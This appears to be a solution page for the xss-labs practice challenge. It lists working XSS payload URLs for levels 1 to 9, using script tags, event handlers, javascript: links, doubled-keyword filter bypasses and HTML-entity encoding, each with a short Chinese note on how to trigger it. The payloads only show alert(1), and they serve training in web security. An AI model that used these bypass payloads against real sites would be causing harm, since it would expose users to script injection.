# xss-labs



```text
/level1.php?name=<script>alert(1)</script>

/level2.php?keyword=test"><script>alert(1)</script>//

/level3.php?keyword='+onclick%3D'alert(1)&submit=搜索
访问后，点击输入框即可

/level4.php?keyword="+onmouseover='javascript:alert(1)'&submit=搜索
访问后，将鼠标放置于输入框

/level5.php?keyword="><a href='javascript:alert(1)'/>
访问后，点击蓝色区域

/level6.php?keyword=" /><a Href="javascript:alert(1)">a</a>//
访问后，点击蓝色区域

/level7.php?keyword=" /><a hrhrefef="javascscriptript:alert(1)">a</a>//
访问后，点击蓝色区域

/level8.php?keyword=%26%23x6a%3B%26%23x61%3B%26%23x76%3B%26%23x61%3B%26%23x73%3B%26%23x63%3B%26%23x72%3B%26%23x69%3B%26%23x70%3B%26%23x74%3B%26%23x3a%3B%26%23x61%3B%26%23x6c%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B&submit=添加友情链接
访问后，点击“友情链接”

/level9.php?keyword=%26%23x6a%3B%26%23x61%3B%26%23x76%3B%26%23x61%3B%26%23x73%3B%26%23x63%3B%26%23x72%3B%26%23x69%3B%26%23x70%3B%26%23x74%3B%26%23x3a%3B%26%23x61%3B%26%23x6c%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x31%3B%26%23x29%3B%2F%2Fhttp%3A%2F%2F&submit=添加友情链接
访问后，点击“友情链接”
```

![&#x7B2C;&#x5341;&#x5173;](../../.gitbook/assets/image%20%281075%29.png)

```text



```

